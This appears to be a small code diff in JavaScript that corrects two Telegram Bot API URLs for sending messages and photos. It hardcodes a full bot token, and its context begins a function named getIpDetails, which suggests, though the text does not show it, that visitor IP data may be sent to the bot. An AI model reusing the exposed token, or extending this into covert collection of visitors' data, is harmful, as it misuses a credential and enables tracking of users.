@@ -1,6 +1,6 @@
 const BOT_TOKEN = "7648285506:AAGsvw5NWPNaM1_nh5PJ9TPGtjaMBnpWVTI"; // Replace with your bot token
-const API_URL = `https://api.telegram.org/bot$7648285506:AAGsvw5NWPNaM1_nh5PJ9TPGtjaMBnpWVTI/sendMessage`;
-const API_FILE_URL = `https://api.telegram.org/bot$7648285506:AAGsvw5NWPNaM1_nh5PJ9TPGtjaMBnpWVTI/sendPhoto`;
+const API_URL = `https://api.telegram.org/bot7648285506:AAGsvw5NWPNaM1_nh5PJ9TPGtjaMBnpWVTI/sendMessage`;
+const API_FILE_URL = `https://api.telegram.org/bot7648285506:AAGsvw5NWPNaM1_nh5PJ9TPGtjaMBnpWVTI/sendPhoto`;
 
 async function getIpDetails() {
     try {
